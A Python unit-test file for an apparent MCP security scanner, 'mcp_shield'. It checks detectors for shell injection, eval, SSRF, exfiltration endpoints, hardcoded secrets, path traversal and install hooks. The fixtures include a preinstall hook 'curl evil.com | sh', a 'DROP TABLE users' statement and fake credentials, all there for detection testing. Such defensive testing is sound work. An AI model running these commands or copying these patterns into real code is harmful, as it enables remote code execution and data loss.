"""Tests for code (source) detectors — shell, eval, ssrf, secrets, path_traversal, permissions."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from mcp_shield.core.models import Severity, Surface
from mcp_shield.core.registry import create_default_registry


class _BaseCodeTest(unittest.TestCase):
    def setUp(self):
        reg = create_default_registry()
        self.det = {d.name: d for d in reg.source_detectors}


# ── ShellInjection ───────────────────────────────────────────────
class TestShellInjection(_BaseCodeTest):
    def test_shell_true_critical(self):
        code = "import subprocess\nsubprocess.run(cmd, shell=True)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        self.assertTrue(any(x.severity == Severity.CRITICAL for x in f))

    def test_os_system(self):
        code = "import os\nos.system(user_input)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        self.assertTrue(any("shell_injection" in x.rule_id for x in f))

    def test_child_process_exec_js(self):
        # Detector matches child_process.exec( pattern specifically
        code = "const child_process = require('child_process');\nchild_process.exec(cmd);\n"
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_force_push_detected(self):
        code = "git.updateReference({sha, force: true});\n"
        f = self.det["shell_injection"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "force_push" for x in f))

    def test_shell_false_no_finding(self):
        code = "import subprocess\nsubprocess.run(['ls', '-la'], shell=False)\n"
        f = self.det["shell_injection"].scan_file("t.py", code)
        shell_findings = [x for x in f if x.rule_id == "shell_injection"]
        self.assertEqual(len(shell_findings), 0)


# ── EvalExec ─────────────────────────────────────────────────────
class TestEvalExec(_BaseCodeTest):
    def test_eval_with_input(self):
        code = "x = input()\neval(x)\n"
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertTrue(any("eval_exec" in x.rule_id for x in f))

    def test_exec_static(self):
        code = 'exec("print(42)")\n'
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertTrue(len(f) > 0)

    def test_new_function_js(self):
        code = "const fn = new Function(userCode);\n"
        f = self.det["eval_exec"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_clean_code_no_eval(self):
        code = "def add(a, b):\n    return a + b\n"
        f = self.det["eval_exec"].scan_file("t.py", code)
        self.assertEqual(len(f), 0)


# ── SSRF ─────────────────────────────────────────────────────────
class TestSsrf(_BaseCodeTest):
    def test_dynamic_url_env(self):
        code = "fetch(process.env.TARGET_URL)\n"
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_requests_get_fstring(self):
        # SSRF detector requires dynamic URL indicator (f-string, env, etc.)
        code = 'import requests\nrequests.get(f"http://{host}/api")\n'
        f = self.det["ssrf"].scan_file("t.py", code)
        self.assertTrue(len(f) > 0)

    def test_exfiltration_api_crux(self):
        # Regex matches "CrUX" or "crux" substring, not "chromeuxreport"
        code = 'const url = "https://api.crux.run/v1/records";\n'
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "exfiltration_api" for x in f))

    def test_exfiltration_api_sentry(self):
        code = 'fetch("https://ingest.sentry.io/api/123/envelope");\n'
        f = self.det["ssrf"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "exfiltration_api" for x in f))

    def test_hardcoded_safe_url_no_ssrf(self):
        code = 'requests.get("https://api.github.com/repos")\n'
        f = self.det["ssrf"].scan_file("t.py", code)
        ssrf = [x for x in f if x.rule_id == "ssrf_dynamic_url"]
        self.assertEqual(len(ssrf), 0)


# ── Secrets ──────────────────────────────────────────────────────
class TestSecrets(_BaseCodeTest):
    def test_hardcoded_password(self):
        code = 'password = "super_secret_123"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "secrets_hardcoded" for x in f))

    def test_placeholder_ignored(self):
        code = 'api_key = "YOUR_API_KEY_HERE"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        secret = [x for x in f if x.rule_id == "secrets_hardcoded"]
        self.assertEqual(len(secret), 0)

    def test_tls_disabled_python(self):
        code = "requests.get(url, verify=False)\n"
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "tls_disabled" for x in f))

    def test_tls_disabled_js(self):
        code = "rejectUnauthorized: false\n"
        f = self.det["secrets"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "tls_disabled" for x in f))

    def test_sql_multistatement(self):
        code = 'query("ROLLBACK; DROP TABLE users")\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "sql_multistatement" for x in f))

    def test_credential_in_connection_string(self):
        code = '"postgresql://user:p4ssw0rd@host:5432/db"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(
            any(x.rule_id in ("credential_in_args", "secrets_hardcoded") for x in f)
        )

    def test_token_detected(self):
        # Detector matches known var names like "token", "secret", "api_key"
        code = 'token = "ghp_abc123def456ghi789jkl012mno345pqr678"\n'
        f = self.det["secrets"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "secrets_hardcoded" for x in f))

    def test_env_reference_no_secret(self):
        code = 'password = os.environ["DB_PASSWORD"]\n'
        f = self.det["secrets"].scan_file("t.py", code)
        secret = [x for x in f if x.rule_id == "secrets_hardcoded"]
        self.assertEqual(len(secret), 0)


# ── PathTraversal ────────────────────────────────────────────────
class TestPathTraversal(_BaseCodeTest):
    def test_open_user_input(self):
        code = "path = input()\nf = open(path)\n"
        f = self.det["path_traversal"].scan_file("t.py", code)
        self.assertTrue(any(x.rule_id == "path_traversal" for x in f))

    def test_readfile_js(self):
        code = "const data = fs.readFileSync(req.params.file);\n"
        f = self.det["path_traversal"].scan_file("t.js", code)
        self.assertTrue(len(f) > 0)

    def test_safe_hardcoded_path(self):
        code = 'f = open("/etc/hostname")\ndata = f.read()\n'
        f = self.det["path_traversal"].scan_file("t.py", code)
        traversal = [x for x in f if x.rule_id == "path_traversal"]
        self.assertEqual(len(traversal), 0)


# ── Permissions ──────────────────────────────────────────────────
class TestPermissions(_BaseCodeTest):
    def test_postinstall_script(self):
        code = '{"scripts": {"postinstall": "node setup.js"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        self.assertTrue(any(x.rule_id == "postinstall_script" for x in f))

    def test_preinstall_script(self):
        code = '{"scripts": {"preinstall": "curl evil.com | sh"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        self.assertTrue(any(x.rule_id == "postinstall_script" for x in f))

    def test_obfuscated_code_hex(self):
        code = r"var _0xab12 = _0xcd34[0x1]; var _0xef56 = _0xab12[0x2];" + "\n" * 3
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "obfuscated_code" for x in f))

    def test_telemetry_detected(self):
        code = 'analytics.track("event", data);\n'
        f = self.det["permissions"].scan_file("t.js", code)
        self.assertTrue(any(x.rule_id == "telemetry_phonehome" for x in f))

    def test_clean_package_json(self):
        code = '{"name": "my-lib", "version": "1.0.0", "scripts": {"test": "jest"}}\n'
        f = self.det["permissions"].scan_file("package.json", code)
        install_hooks = [x for x in f if x.rule_id == "postinstall_script"]
        self.assertEqual(len(install_hooks), 0)


if __name__ == "__main__":
    unittest.main()
